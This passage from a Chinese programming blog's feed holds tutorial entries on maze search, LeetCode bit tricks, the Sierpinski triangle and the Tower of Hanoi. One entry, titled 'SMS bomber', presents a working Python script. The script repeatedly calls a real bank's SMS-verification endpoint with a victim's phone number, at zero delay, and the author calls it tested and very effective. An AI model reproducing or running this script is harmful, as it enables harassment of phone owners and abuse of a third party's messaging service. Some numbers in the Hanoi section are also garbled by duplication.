class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>]]</div></pre></td></tr></table></figure><p><code>drawMaze</code> 方法使用这个内部表示在屏幕上绘制迷宫的初始视图。</p><p>Figure 3：示例迷宫数据文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">++++++++++++++++++++++</div><div class="line">+   +   ++ ++     +</div><div class="line">+ +   +       +++ + ++</div><div class="line">+ + +  ++  ++++   + ++</div><div class="line">+++ ++++++    +++ +  +</div><div class="line">+          ++  ++    +</div><div class="line">+++++ ++++++   +++++ +</div><div class="line">+     +   +++++++  + +</div><div class="line">+ +++++++      S +   +</div><div class="line">+                + +++</div><div class="line">++++++++++++++++++ +++</div></pre></td></tr></table></figure><p><em>Figure 3</em></p><p>如 Listing 5 所示，<code>updatePosition</code> 方法使用相同的内部表示来查看乌龟是否遇到了墙。它还用 <code>.</code> 或 <code>-</code> 更新内部表示，以表示乌龟已经访问了特定格子或者格子是死角。 此外，<code>updatePosition</code> 方法使用两个辅助方法<code>moveTurtle</code> 和 <code>dropBreadCrumb</code> 来更新屏幕上的视图。</p><p>最后，<code>isExit</code> 方法使用乌龟的当前位置来检测退出条件。退出条件是当乌龟已经到迷宫的边缘时，即行零或列零，或者在最右边列或底部行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maze</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,mazeFileName)</span>:</span></div><div class="line">        rowsInMaze = <span class="number">0</span></div><div class="line">        columnsInMaze = <span class="number">0</span></div><div class="line">        self.mazelist = []</div><div class="line">        mazeFile = open(mazeFileName,<span class="string">'r'</span>)</div><div class="line">        rowsInMaze = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> mazeFile:</div><div class="line">            rowList = []</div><div class="line">            col = <span class="number">0</span></div><div class="line">            <span class="keyword">for</span> ch <span class="keyword">in</span> line[:<span class="number">-1</span>]:</div><div class="line">                rowList.append(ch)</div><div class="line">                <span class="keyword">if</span> ch == <span class="string">'S'</span>:</div><div class="line">                    self.startRow = rowsInMaze</div><div class="line">                    self.startCol = col</div><div class="line">                col = col + <span class="number">1</span></div><div class="line">            rowsInMaze = rowsInMaze + <span class="number">1</span></div><div class="line">            self.mazelist.append(rowList)</div><div class="line">            columnsInMaze = len(rowList)</div><div class="line"></div><div class="line">        self.rowsInMaze = rowsInMaze</div><div class="line">        self.columnsInMaze = columnsInMaze</div><div class="line">        self.xTranslate = -columnsInMaze/<span class="number">2</span></div><div class="line">        self.yTranslate = rowsInMaze/<span class="number">2</span></div><div class="line">        self.t = Turtle(shape=<span class="string">'turtle'</span>)</div><div class="line">        setup(width=<span class="number">600</span>,height=<span class="number">600</span>)</div><div class="line">        setworldcoordinates(-(columnsInMaze<span class="number">-1</span>)/<span class="number">2</span><span class="number">-.5</span>,</div><div class="line">                            -(rowsInMaze<span class="number">-1</span>)/<span class="number">2</span><span class="number">-.5</span>,</div><div class="line">                            (columnsInMaze<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">.5</span>,</div><div class="line">                            (rowsInMaze<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">.5</span>)</div></pre></td></tr></table></figure><p><em>Listing 4</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawMaze</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(self.rowsInMaze):</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(self.columnsInMaze):</div><div class="line">            <span class="keyword">if</span> self.mazelist[y][x] == OBSTACLE:</div><div class="line">                self.drawCenteredBox(x+self.xTranslate,</div><div class="line">                                     -y+self.yTranslate,</div><div class="line">                                     <span class="string">'tan'</span>)</div><div class="line">    self.t.color(<span class="string">'black'</span>,<span class="string">'blue'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawCenteredBox</span><span class="params">(self,x,y,color)</span>:</span></div><div class="line">    tracer(<span class="number">0</span>)</div><div class="line">    self.t.up()</div><div class="line">    self.t.goto(x<span class="number">-.5</span>,y<span class="number">-.5</span>)</div><div class="line">    self.t.color(<span class="string">'black'</span>,color)</div><div class="line">    self.t.setheading(<span class="number">90</span>)</div><div class="line">    self.t.down()</div><div class="line">    self.t.begin_fill()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        self.t.forward(<span class="number">1</span>)</div><div class="line">        self.t.right(<span class="number">90</span>)</div><div class="line">    self.t.end_fill()</div><div class="line">    update()</div><div class="line">    tracer(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveTurtle</span><span class="params">(self,x,y)</span>:</span></div><div class="line">    self.t.up()</div><div class="line">    self.t.setheading(self.t.towards(x+self.xTranslate,</div><div class="line">                                     -y+self.yTranslate))</div><div class="line">    self.t.goto(x+self.xTranslate,-y+self.yTranslate)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dropBreadcrumb</span><span class="params">(self,color)</span>:</span></div><div class="line">    self.t.dot(color)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">updatePosition</span><span class="params">(self,row,col,val=None)</span>:</span></div><div class="line">    <span class="keyword">if</span> val:</div><div class="line">        self.mazelist[row][col] = val</div><div class="line">    self.moveTurtle(col,row)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> val == PART_OF_PATH:</div><div class="line">        color = <span class="string">'green'</span></div><div class="line">    <span class="keyword">elif</span> val == OBSTACLE:</div><div class="line">        color = <span class="string">'red'</span></div><div class="line">    <span class="keyword">elif</span> val == TRIED:</div><div class="line">        color = <span class="string">'black'</span></div><div class="line">    <span class="keyword">elif</span> val == DEAD_END:</div><div class="line">        color = <span class="string">'red'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        color = <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> color:</div><div class="line">        self.dropBreadcrumb(color)</div></pre></td></tr></table></figure><p><em>Listing 5</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isExit</span><span class="params">(self,row,col)</span>:</span></div><div class="line">     <span class="keyword">return</span> (row == <span class="number">0</span> <span class="keyword">or</span></div><div class="line">             row == self.rowsInMaze<span class="number">-1</span> <span class="keyword">or</span></div><div class="line">             col == <span class="number">0</span> <span class="keyword">or</span></div><div class="line">             col == self.columnsInMaze<span class="number">-1</span> )</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self,idx)</span>:</span></div><div class="line">     <span class="keyword">return</span> self.mazelist[idx]</div></pre></td></tr></table></figure><p><em>Listing 6</em></p><p>其实吧，这段代码很多变量都没有去定义，关于迷宫的构造函数就不用在意了，关注isExit的思想与searchFrom思想就行了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;探索迷宫&quot;&gt;&lt;a href=&quot;#探索迷宫&quot; class=&quot;headerlink&quot; title=&quot;探索迷宫&quot;&gt;&lt;/a&gt;探索迷宫&lt;/h1&gt;&lt;p&gt;在这一节中，我们将讨论一个与扩展机器人世界相关的问题：你如何找到自己的迷宫？
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>短信轰炸机</title>
    <link href="http://adamzeng.site/2017/11/04/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%9C%BA/"/>
    <id>http://adamzeng.site/2017/11/04/短信轰炸机/</id>
    <published>2017-11-04T13:07:59.000Z</published>
    <updated>2017-11-04T13:11:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>用Python写成的短信轰炸机，亲测非常有效，代码如下：<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    print(<span class="string">"请输入手机号"</span>,end=<span class="string">":"</span>)</div><div class="line">    mobile=input()</div><div class="line">    <span class="keyword">if</span> len(mobile) != <span class="number">11</span>: <span class="comment">#判断输入长度</span></div><div class="line">        print(<span class="string">"手机号码长度错误！"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"请输入轰炸次数"</span>, end=<span class="string">":"</span>)</div><div class="line">        num = int(input())</div><div class="line">        print(<span class="string">"你要轰炸"</span>,num,<span class="string">"次"</span>,<span class="string">"马上开始!"</span>)</div><div class="line">        i = <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> num &gt; <span class="number">0</span> :</div><div class="line">            payload = &#123;<span class="string">"AcNo"</span>:<span class="string">""</span>,<span class="string">"MobilePhone"</span>:<span class="string">""</span>,<span class="string">"BankId"</span>:<span class="string">"9999"</span>,<span class="string">"Transaction"</span>:<span class="string">"CreditOnlineApplyCert"</span>,<span class="string">"_locale"</span>:<span class="string">"zh_CN"</span>&#125; <span class="comment">#构造关键字的字典</span></div><div class="line">            payload[<span class="string">"MobilePhone"</span>]= mobile <span class="comment">#添加字典内容</span></div><div class="line">            url = <span class="string">"https://pbank.psbc.com/pweb/GetSmsForOutQuickPayment.do?"</span></div><div class="line">            r = requests.get(url,params=payload) <span class="comment">#开始get 并构造了url</span></div><div class="line">            print(<span class="string">"正在轰炸"</span>,mobile,<span class="string">"，轰炸第"</span>,i,<span class="string">"次"</span>)</div><div class="line">            num = num - <span class="number">1</span></div><div class="line">            i+=<span class="number">1</span></div><div class="line">            time.sleep(<span class="number">0</span>)<span class="comment"># 间隔时间</span></div><div class="line">        print(<span class="string">"轰炸完成！"</span>)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用Python写成的短信轰炸机，亲测非常有效，代码如下：
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>leetcode190题131题191题231题342题</title>
    <link href="http://adamzeng.site/2017/11/03/leetcode190/"/>
    <id>http://adamzeng.site/2017/11/03/leetcode190/</id>
    <published>2017-11-03T12:53:46.000Z</published>
    <updated>2017-11-04T03:22:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode190题131题191题231题342题"><a href="#leetcode190题131题191题231题342题" class="headerlink" title="leetcode190题131题191题231题342题"></a>leetcode190题131题191题231题342题</h1><h3 id="190Reverse-Bits"><a href="#190Reverse-Bits" class="headerlink" title="190Reverse Bits"></a>190Reverse Bits</h3><p>Reverse bits of a given 32 bits unsigned integer.<a id="more"></a></p><p>For example, given input 43261596 (represented in binary as <strong>00000010100101000001111010011100</strong>), return 964176192 (represented in binary as <strong>00111001011110000010100101000000</strong>).</p><p><strong>Follow up</strong>:<br>If this function is called many times, how would you optimize it?</p><p>Related problem: <a href="https://leetcode.com/problems/reverse-integer/" target="_blank" rel="external">Reverse Integer</a></p><p><strong>Credits:</strong><br>Special thanks to <a href="https://oj.leetcode.com/discuss/user/ts" target="_blank" rel="external">@ts</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># @param n, an integer</span></div><div class="line">    <span class="comment"># @return an integer</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBits</span><span class="params">(self, n)</span>:</span></div><div class="line">        </div><div class="line">        result = <span class="number">0</span></div><div class="line">        </div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>):</div><div class="line">            bit = n%<span class="number">2</span></div><div class="line">            result = result*<span class="number">2</span> + bit</div><div class="line">            n = n/<span class="number">2</span></div><div class="line">        </div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure><h3 id="131Single-Number"><a href="#131Single-Number" class="headerlink" title="131Single Number"></a>131Single Number</h3><p>Given an array of integers, every element appears <em>twice</em> except for one. Find that single one.</p><p><strong>Note:</strong><br>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> operator</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumber</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">return</span> reduce(operator.xor,nums)</div></pre></td></tr></table></figure><h3 id="191Number-of-1-Bits"><a href="#191Number-of-1-Bits" class="headerlink" title="191Number of 1 Bits"></a>191Number of 1 Bits</h3><p>Write a function that takes an unsigned integer and returns the number of ’1’ bits it has (also known as the <a href="https://en.wikipedia.org/wiki/Hamming_weight" target="_blank" rel="external">Hamming weight</a>).</p><p>For example, the 32-bit integer ’11’ has binary representation <code>00000000000000000000000000001011</code>, so the function should return 3.</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://oj.leetcode.com/discuss/user/ts" target="_blank" rel="external">@ts</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingWeight</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        times=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>):</div><div class="line">            bit=n%<span class="number">2</span></div><div class="line">            <span class="keyword">if</span> bit==<span class="number">1</span>:</div><div class="line">                times=times+<span class="number">1</span></div><div class="line">            n=n/<span class="number">2</span></div><div class="line">        <span class="keyword">return</span> times</div></pre></td></tr></table></figure><p>sorry啦！性能只超过了40%，看了最优化的答案：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingWeight</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        res = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">            res += (n &amp; <span class="number">1</span>)</div><div class="line">            n &gt;&gt;= <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure><p>想了一下，其实是把每一位移到最后一位，与1进行&amp;运算，就可以判断该位是否存在1。</p><h3 id="231Power-of-Two"><a href="#231Power-of-Two" class="headerlink" title="231Power of Two"></a>231Power of Two</h3><p>Given an integer, write a function to determine if it is a power of two.</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://leetcode.com/discuss/user/jianchao.li.fighter" target="_blank" rel="external">@jianchao.li.fighter</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPowerOfTwo</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> n&lt;=<span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> (n&amp;(n<span class="number">-1</span>))==<span class="number">0</span></div></pre></td></tr></table></figure><p>对于一个二进制数而言，例如10000，它减去1以后的数是1111，再进行&amp;运算，必须是零，这是所有power of two，也就是2的次方数（1024等）的特点。</p><h3 id="342Power-of-Four"><a href="#342Power-of-Four" class="headerlink" title="342Power of Four"></a>342Power of Four</h3><p>Given an integer (signed 32 bits), write a function to check whether it is a power of 4.</p><p><strong>Example:</strong><br>Given num = 16, return true. Given num = 5, return false.</p><p><strong>Follow up</strong>: Could you solve it without loops/recursion?</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://leetcode.com/discuss/user/yukuairoy" target="_blank" rel="external">@yukuairoy </a>for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPowerOfFour</span><span class="params">(self, num)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type num: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">while</span> num%<span class="number">4</span>==<span class="number">0</span>:</div><div class="line">            num/=<span class="number">4</span></div><div class="line">        <span class="keyword">return</span> num==<span class="number">1</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode190题131题191题231题342题&quot;&gt;&lt;a href=&quot;#leetcode190题131题191题231题342题&quot; class=&quot;headerlink&quot; title=&quot;leetcode190题131题191题231题342题&quot;&gt;&lt;/a&gt;leetcode190题131题191题231题342题&lt;/h1&gt;&lt;h3 id=&quot;190Reverse-Bits&quot;&gt;&lt;a href=&quot;#190Reverse-Bits&quot; class=&quot;headerlink&quot; title=&quot;190Reverse Bits&quot;&gt;&lt;/a&gt;190Reverse Bits&lt;/h3&gt;&lt;p&gt;Reverse bits of a given 32 bits unsigned integer.
    
    </summary>
    
      <category term="leetcode" scheme="http://adamzeng.site/categories/leetcode/"/>
    
    
      <category term="leetcode" scheme="http://adamzeng.site/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>谢尔宾斯基三角形</title>
    <link href="http://adamzeng.site/2017/11/03/%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2/"/>
    <id>http://adamzeng.site/2017/11/03/谢尔宾斯基三角形/</id>
    <published>2017-11-03T09:08:42.000Z</published>
    <updated>2017-11-04T13:16:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="谢尔宾斯基三角形"><a href="#谢尔宾斯基三角形" class="headerlink" title="谢尔宾斯基三角形"></a>谢尔宾斯基三角形</h1><p>另外一个展现自相似性的分形是谢尔宾斯基三角形。<a id="more"></a>Figure 3是一个示例。谢尔宾斯基三角形阐明了三路递归算法。用手绘制谢尔宾斯三角形的过程很简答。从一个大三角形开始。通过连接每一边的中点，将这个大三角形分成四个新的三角形。忽略刚刚创建的中间三角形，对三个三角形中的每一个应用相同的过程。每一次创建一组新的三角形时，都会将此过程递归应用于三个较小的角三角形。如果你有足够的铅笔，你可以无限重复这个过程。在继续阅读之前，你可以尝试运用所描述的方法自己绘制谢尔宾斯基三角形。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.8.%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2/assets/4.8.%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p>因为我们可以无限地应用算法，什么是基本情况？我们将看到，基本情况被任意设置为我们想要将三角形划分成块的次数。有时我们把这个数字称为分形的“度”。每次我们进行递归调用时，我们从度中减去1，直到0。当我们达到0度时，我们停止递归。在Figure3中生成谢尔宾斯基三角形的代码见ActiveCode 1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawTriangle</span><span class="params">(points,color,myTurtle)</span>:</span></div><div class="line">    myTurtle.fillcolor(color)</div><div class="line">    myTurtle.up()</div><div class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.down()</div><div class="line">    myTurtle.begin_fill()</div><div class="line">    myTurtle.goto(points[<span class="number">1</span>][<span class="number">0</span>],points[<span class="number">1</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.goto(points[<span class="number">2</span>][<span class="number">0</span>],points[<span class="number">2</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.end_fill()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMid</span><span class="params">(p1,p2)</span>:</span></div><div class="line">    <span class="keyword">return</span> ((p1[<span class="number">0</span>]+p2[<span class="number">0</span>])/<span class="number">2</span>,(p1[<span class="number">1</span>]+p2[<span class="number">1</span>])/<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sierpinski</span><span class="params">(points,degree,myTurtle)</span>:</span></div><div class="line">    colormap=[<span class="string">'blue'</span>,<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'white'</span>,<span class="string">'yellow'</span>,</div><div class="line">              <span class="string">'violet'</span>,<span class="string">'orange'</span>]</div><div class="line">    drawTriangle(points,colormap[degree],myTurtle)</div><div class="line">    <span class="keyword">if</span> degree&gt;<span class="number">0</span>:</div><div class="line">        sierpinski([points[<span class="number">0</span>],</div><div class="line">                   getMid(points[<span class="number">0</span>],points[<span class="number">1</span>]),</div><div class="line">                   getMid(points[<span class="number">0</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line">        sierpinski([points[<span class="number">1</span>],</div><div class="line">                    getMid(points[<span class="number">0</span>],points[<span class="number">1</span>]),</div><div class="line">                    getMid(points[<span class="number">1</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line">        sierpinski([points[<span class="number">2</span>],</div><div class="line">                    getMid(points[<span class="number">2</span>],points[<span class="number">1</span>]),</div><div class="line">                    getMid(points[<span class="number">0</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    myTurtle=turtle.Turtle()</div><div class="line">    myWin=turtle.Screen()</div><div class="line">    myPoints=[[<span class="number">-100</span>,<span class="number">-50</span>],[<span class="number">0</span>,<span class="number">100</span>],[<span class="number">100</span>,<span class="number">-50</span>]]</div><div class="line">    sierpinski(myPoints,<span class="number">3</span>,myTurtle)</div><div class="line">    myWin.exitonclick()</div><div class="line"></div><div class="line">    </div><div class="line">main()</div></pre></td></tr></table></figure><p>其实这段代码我没看懂太多，写的关于point的逻辑很奇怪。。。</p><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><p>汉诺塔是由法国数学家爱德华·卢卡斯在 1883 年发明的。他的灵感来自一个传说，有一个印度教寺庙，将谜题交给年轻的牧师。在开始的时候，牧师们被给予三根杆和一堆 64 个金碟，每个盘比它下面一个小一点。他们的任务是将所有 64 个盘子从三个杆中一个转移到另一个。有两个重要的约束，它们一次只能移动一个盘子，并且它们不能在较小的盘子顶部上放置更大的盘子。牧师日夜不停每秒钟移动一块盘子。当他们完成工作时，传说，寺庙会变成灰尘，世界将消失。</p><p>虽然传说是有趣的，你不必担心世界不久的将来会消失。移动 64 个盘子的塔所需的步骤数是 <code>2^64 -1 = 18,446,744,073,709,551,615264-1 = 18,446,744,073,709,551,615</code>。以每秒一次的速度，即<code>584,942,417,355584,942,417,355</code> 年！。</p><p>Figure 1 展示了在从第一杆移动到第三杆的过程中的盘的示例。请注意，如规则指定，每个杆上的盘子都被堆叠起来，以使较小的盘子始终位于较大盘的顶部。如果你以前没有尝试过解决这个难题，你现在应该尝试下。你不需要花哨的盘子，一堆书或纸张都可以。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.10.%E6%B1%89%E8%AF%BA%E5%A1%94%E6%B8%B8%E6%88%8F/assets/4.10.%E6%B1%89%E8%AF%BA%E5%A1%94%E6%B8%B8%E6%88%8F.figure1.png" alt="image"></p><p><em>Figure 